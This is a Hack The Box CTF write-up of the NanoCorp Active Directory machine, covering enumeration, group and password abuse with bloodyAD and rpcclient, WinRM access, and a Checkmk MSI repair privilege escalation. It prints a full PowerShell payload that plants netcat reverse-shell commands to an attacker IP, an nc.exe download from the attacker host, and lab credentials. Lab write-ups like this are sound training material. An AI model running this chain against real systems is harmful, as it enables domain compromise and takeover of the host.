# NanoCorp Write-up

> Hack The Box / CTF write-up  
> Flag values and flag-reading commands have been intentionally removed.

## Enumeration

I started by scanning the target with Nmap:

```bash
nmap -sSVC -A 10.129.243.199
```

The scan exposed a typical Windows Active Directory attack surface:

```text
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Apache httpd 2.4.58
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP
636/tcp  open  ldapssl
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP
3269/tcp open  globalcatLDAPssl
5986/tcp open  ssl/http     Microsoft HTTPAPI httpd 2.0
```

The HTTP service redirected to:

```text
http://nanocorp.htb/
```

The TLS certificate on port `5986` identified the domain controller as:

```text
dc01.nanocorp.htb
```

The target appeared to be Windows Server 2022, and SMB signing was enabled and required.

## LDAP Enumeration

I queried the LDAP root DSE:

```bash
ldapsearch -x -H ldap://10.129.243.199 \
  -s base namingcontexts defaultNamingContext dnsHostName
```

The response confirmed:

```text
dnsHostName: DC01.nanocorp.htb
defaultNamingContext: DC=nanocorp,DC=htb

namingcontexts: DC=nanocorp,DC=htb
namingcontexts: CN=Configuration,DC=nanocorp,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=nanocorp,DC=htb
namingcontexts: DC=DomainDnsZones,DC=nanocorp,DC=htb
namingcontexts: DC=ForestDnsZones,DC=nanocorp,DC=htb
```

This confirmed the Active Directory domain:

```text
nanocorp.htb
```

and the domain controller:

```text
DC01.nanocorp.htb
```

## WEB_SVC Credentials and SMB Enumeration

The original write-up uses the following service account credentials:

```text
Username: WEB_SVC
Password: dksehdgh712!@#
Domain:   nanocorp.htb
```

The supplied write-up does not show the step where these credentials were originally obtained, so that part is not reconstructed here.

I used NetExec to enumerate SMB shares:

```bash
netexec smb 10.129.243.199 \
  -d nanocorp.htb \
  -u WEB_SVC \
  -p 'dksehdgh712!@#' \
  --shares
```

Authentication succeeded:

```text
nanocorp.htb\WEB_SVC:dksehdgh712!@#
```

The accessible shares included:

```text
IPC$      READ
NETLOGON  READ
SYSVOL    READ
```

The host was identified as:

```text
Windows Server 2022 Build 20348
DC01.nanocorp.htb
```

## BloodHound Collection

I collected Active Directory data with NetExec:

```bash
netexec ldap 10.129.243.199 \
  -d nanocorp.htb \
  -u WEB_SVC \
  -p 'dksehdgh712!@#' \
  --bloodhound \
  --collection All \
  --dns-server 10.129.243.199
```

The collection completed successfully and generated a BloodHound ZIP archive.

The original output lists collection methods including:

```text
localadmin
objectprops
psremote
group
dcom
session
acl
trusts
container
rdp
```

## Adding WEB_SVC to IT_Support

Based on the permissions discovered during Active Directory enumeration, I added `web_svc` to the `IT_Support` group using `bloodyAD`:

```bash
bloodyAD \
  --host 10.129.243.199 \
  -d nanocorp.htb \
  -u web_svc \
  -p 'dksehdgh712!@#' \
  add groupMember \
  'CN=IT_Support,CN=Users,DC=nanocorp,DC=htb' \
  'CN=web_svc,CN=Users,DC=nanocorp,DC=htb'
```

The command succeeded:

```text
[+] CN=web_svc,CN=Users,DC=nanocorp,DC=htb added to
    CN=IT_Support,CN=Users,DC=nanocorp,DC=htb
```

## Resetting the monitoring_svc Password

With the new group membership, the next step in the supplied write-up was to reset the password of the `monitoring_svc` account through RPC:

```bash
rpcclient \
  -U 'nanocorp.htb/web_svc%dksehdgh712!@#' \
  10.129.243.199 \
  -c 'setuserinfo2 monitoring_svc 23 NanoTemp2_2026!'
```

The password used afterward was:

```text
NanoTemp2_2026!
```

## WinRM Access as monitoring_svc

The target exposed WinRM over HTTPS on TCP port `5986`.

The write-up used `winrmexec`:

```bash
git clone https://github.com/ozelis/winrmexec.git
cd winrmexec
```

Because the Nmap results showed a significant clock skew between the attacker and the domain controller, the command was run through `faketime`:

```bash
faketime -f '+25199s' \
python3 winrmexec.py \
  -ssl \
  -port 5986 \
  -k \
  nanocorp.htb/monitoring_svc@dc01.nanocorp.htb
```

The tool requested a Kerberos service ticket for:

```text
HTTP/dc01.nanocorp.htb@NANOCORP.HTB
```

and successfully provided a PowerShell session as:

```text
NANOCORP.HTB\monitoring_svc
```

The user flag was available from this account, but both the flag value and the command used solely to print it have been removed from this public version.

## Privilege Escalation Enumeration

From the `monitoring_svc` PowerShell session, I checked the current user and local administrators:

```powershell
whoami
net localgroup administrators
```

The current account was:

```text
nanocorp\monitoring_svc
```

The local Administrators group contained:

```text
Administrator
Domain Admins
Enterprise Admins
```

I also searched for monitoring-related processes and Checkmk-related files:

```powershell
Get-Process | Where-Object {
    $_.Path -like "*monitor*"
}

dir C:\ -Recurse -Filter "*check_mk*" \
    -ErrorAction SilentlyContinue |
    Select FullName
```

The next stage targeted the locally installed Checkmk MSI repair process.

## Checkmk MSI Repair Abuse

The supplied write-up creates a PowerShell script called:

```text
C:\Windows\Temp\bad.ps1
```

The script generates many specially named `.cmd` files in `C:\Windows\Temp` and then starts an MSI repair of the installed Checkmk package.

Below is the same script with the Russian comments translated to English:

```powershell
# Create bad.ps1 with the required content
$payload = @'
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 20000,
    [string]$LHOST = "10.10.15.225",
    [string]$LPORT = "7001"
)

$NcPath = "C:\Windows\Temp\nc.exe"
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"

# Find the Checkmk MSI path
$msi = (
    Get-ItemProperty `
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
    Where-Object {
        $_.DisplayName -like '*Checkmk*' -or
        $_.DisplayName -like '*mk*'
    } |
    Select-Object -First 1
).LocalPackage

Write-Host "[+] MSI found: $msi"

# Create trap files
for ($ctr = 0; $ctr -le 2; $ctr++) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"

        try {
            [System.IO.File]::WriteAllText(
                $filePath,
                $BatchPayload,
                [System.Text.Encoding]::ASCII
            )

            Set-ItemProperty `
                -Path $filePath `
                -Name IsReadOnly `
                -Value $true
        }
        catch {}
    }
}

Write-Host "[+] Files seeded. Starting MSI repair..."

Start-Process "msiexec.exe" `
    -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" `
    -Wait
'@

$payload |
    Out-File `
    -FilePath C:\Windows\Temp\bad.ps1 `
    -Encoding ASCII `
    -Force
```

The script uses a PID range from `1000` to `20000` and creates filenames following this pattern:

```text
C:\Windows\Temp\cmk_all_<PID>_<counter>.cmd
```

Each generated command file contains:

```text
C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.225 7001
```

The script then locates the installed Checkmk MSI package through the Windows Installer registry and launches:

```text
msiexec.exe /fa "<Checkmk MSI>" /qn /l*vx C:\Windows\Temp\cmk_repair.log
```

## Delivering the Payload

The original write-up downloaded `nc.exe` to the Windows temporary directory:

```powershell
powershell -c "
Invoke-WebRequest `
  -Uri http://10.10.15.225:8000/nc.exe `
  -OutFile C:\Windows\Temp\nc.exe
"
```

It then used `RunasCs.exe` with the previously known `web_svc` credentials to execute the PowerShell payload:

```powershell
.\RunasCs.exe \
  web_svc \
  "dksehdgh712!@#" \
  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1"
```

The supplied write-up indicates that abusing the Checkmk MSI repair workflow in this way resulted in administrative/root-equivalent access on the Windows host.

The Administrator flag was retrieved after this step in the original document, but the flag value and the command used solely to print it have been removed.

## Attack Path

```text
Nmap
  |
  v
nanocorp.htb / DC01
  |
  v
LDAP enumeration
  |
  v
WEB_SVC credentials
  |
  v
SMB + BloodHound enumeration
  |
  v
Add WEB_SVC to IT_Support
  |
  v
Reset monitoring_svc password
  |
  v
Kerberos / WinRM over HTTPS
  |
  v
PowerShell as monitoring_svc
  |
  v
Checkmk / monitoring enumeration
  |
  v
Seed cmk_all_<PID>_<counter>.cmd files
  |
  v
Trigger Checkmk MSI repair
  |
  v
Privileged command execution
  |
  v
Administrator
```

## Notes

- All flag values have been removed.
- Commands whose only purpose was to display the user or Administrator flag have also been removed.
- Russian comments from the original PowerShell payload were translated to English.
- Content that was shown only inside screenshots has been rewritten as searchable, copyable text.
- The source write-up does not show how the initial `WEB_SVC` credentials were obtained, so that step is explicitly left undocumented rather than guessed.
- The exact vulnerability identifier for the Checkmk/MSI repair privilege-escalation technique is not stated in the supplied write-up, so no CVE number has been invented.
